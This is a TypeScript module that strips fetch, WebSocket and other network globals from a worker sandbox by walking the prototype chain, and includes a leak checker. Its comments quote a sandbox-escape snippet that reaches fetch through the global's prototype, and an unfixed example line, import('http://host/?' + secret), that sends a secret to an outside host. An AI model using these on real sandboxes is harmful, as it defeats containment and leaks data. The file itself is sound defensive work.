/**
 * Strips network capability from a worker's global scope.
 *
 * The previous attempt did `Object.defineProperty(self, "fetch", {value:
 * undefined})`, which only creates an **own** property shadowing the global.
 * `fetch`, `XMLHttpRequest`, `WebSocket` and `postMessage` actually live on
 * `DedicatedWorkerGlobalScope.prototype`, so a script body could walk past the
 * shadow:
 *
 *     const g = Function("return this")();
 *     Object.getPrototypeOf(g).fetch.call(g, "/rpc", …)
 *
 * An audit used exactly that to pull a 60KB project document out of the
 * sandbox. Deleting along the whole prototype chain closes it.
 *
 * KNOWN GAP: dynamic `import()` is syntax, not a property, so it cannot be
 * removed this way — `import("http://host/?" + secret)` remains a GET
 * exfiltration path. Closing that needs a CSP (`connect-src 'none'`) on the
 * sandbox realm, which a plain Worker cannot carry; it requires hosting the
 * sandbox in a sandboxed iframe. Tracked separately.
 */
export const BLOCKED_GLOBALS = [
  "fetch",
  "XMLHttpRequest",
  "WebSocket",
  "importScripts",
  "EventSource",
  "Request",
  "Response",
  "indexedDB",
  "caches",
  "Worker",
  "SharedWorker",
  "BroadcastChannel",
  "navigator",
  "postMessage",
] as const;

/**
 * @param scope the worker global
 * @param keep names the sandbox host still needs (the harness keeps its own
 *   captured reference before calling this)
 */
export function hardenWorkerScope(scope: object, keep: readonly string[] = []): void {
  const blocked = BLOCKED_GLOBALS.filter((name) => !keep.includes(name));

  // Walk the whole chain: the own object, then every prototype up to
  // Object.prototype. The capability lives on the prototype, not the instance.
  let target: object | null = scope;
  while (target && target !== Object.prototype) {
    for (const name of blocked) {
      if (!Object.prototype.hasOwnProperty.call(target, name)) continue;
      try {
        delete (target as Record<string, unknown>)[name];
      } catch {
        /* non-configurable; the redefine below is the fallback */
      }
      try {
        Object.defineProperty(target, name, { value: undefined, configurable: false, writable: false });
      } catch {
        /* already locked down */
      }
    }
    target = Object.getPrototypeOf(target) as object | null;
  }
}

/** True when every blocked global is unreachable, including via the prototype chain. */
export function verifyHardened(scope: object, keep: readonly string[] = []): string[] {
  const leaks: string[] = [];
  for (const name of BLOCKED_GLOBALS) {
    if (keep.includes(name)) continue;
    if (typeof (scope as Record<string, unknown>)[name] === "function") leaks.push(`${name} (own)`);
    let target: object | null = Object.getPrototypeOf(scope) as object | null;
    while (target && target !== Object.prototype) {
      const descriptor = Object.getOwnPropertyDescriptor(target, name);
      if (descriptor && (typeof descriptor.value === "function" || descriptor.get)) {
        leaks.push(`${name} (prototype)`);
        break;
      }
      target = Object.getPrototypeOf(target) as object | null;
    }
  }
  return leaks;
}
